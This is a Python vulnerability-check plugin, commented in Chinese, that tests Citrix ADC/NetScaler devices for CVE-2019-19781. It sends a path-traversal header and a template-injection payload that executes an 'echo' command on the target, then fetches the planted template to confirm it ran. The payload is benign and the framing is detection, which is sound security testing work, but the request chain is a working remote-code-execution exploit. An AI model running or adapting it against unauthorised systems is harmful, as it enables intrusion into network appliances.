import requests
import random
import string
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class CitrixVuln:
    name = "Citrix ADC/Netscaler RCE漏洞 (CVE-2019-19781)"
    description = "Citrix应用交付控制器和网关设备远程代码执行漏洞检测"
    author = "Security Researcher"
    group = "Network Devices"
    
    def check(self, target):
        """
        安全检测Citrix设备是否存在CVE-2019-19781漏洞
        :param target: 目标URL (如 https://example.com)
        :return: 检测结果字符串
        """
        if not target.startswith(("http://", "https://")):
            target = "https://" + target
            
        result = ""
        random_xml = ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))
        
        try:
            # 第一阶段：验证漏洞存在性（不执行实际命令）
            test_url = target.rstrip("/") + "/vpn/../vpns/portal/scripts/newbm.pl"
            headers = {
                "NSC_USER": f"../../../../netscaler/portal/templates/{random_xml}",
                "NSC_NONCE": "c",
                "Connection": "close"
            }
            
            # 使用无害的测试payload
            test_data = {
                "url": "http://example.com",
                "title": "[%t=template.new({'BLOCK'='print `echo vuln_test`'})%][ % t % ]",
                "desc": "security_test",
                "UI_inuse": "RfWeb"
            }
            
            # 发送测试请求
            response = requests.post(
                test_url,
                headers=headers,
                data=test_data,
                verify=False,
                timeout=15
            )
            
            if response.status_code == 200:
                # 第二阶段：验证模板是否创建成功（不显示命令输出）
                verify_url = target.rstrip("/") + f"/vpns/portal/{random_xml}.xml"
                verify_resp = requests.get(
                    verify_url,
                    headers=headers,
                    verify=False,
                    timeout=10
                )
                
                if verify_resp.status_code == 200:
                    if "vuln_test" in verify_resp.text:
                        result = f"[{self.name}] 目标 {target}：存在CVE-2019-19781漏洞（高危RCE）"
                    else:
                        result = f"[{self.name}] 目标 {target}：可能存在CVE-2019-19781漏洞（需进一步验证）"
                else:
                    result = f"[{self.name}] 目标 {target}：漏洞验证失败（HTTP {verify_resp.status_code}）"
            else:
                result = f"[{self.name}] 目标 {target}：未发现CVE-2019-19781漏洞（HTTP {response.status_code}）"
                
        except requests.exceptions.Timeout:
            result = f"[{self.name}] 目标 {target}：检测超时"
        except requests.exceptions.SSLError:
            result = f"[{self.name}] 目标 {target}：SSL证书验证失败"
        except requests.exceptions.ConnectionError:
            result = f"[{self.name}] 目标 {target}：连接失败"
        except Exception as e:
            result = f"[{self.name}] 目标 {target}：检测异常 - {str(e)}"
        
        return result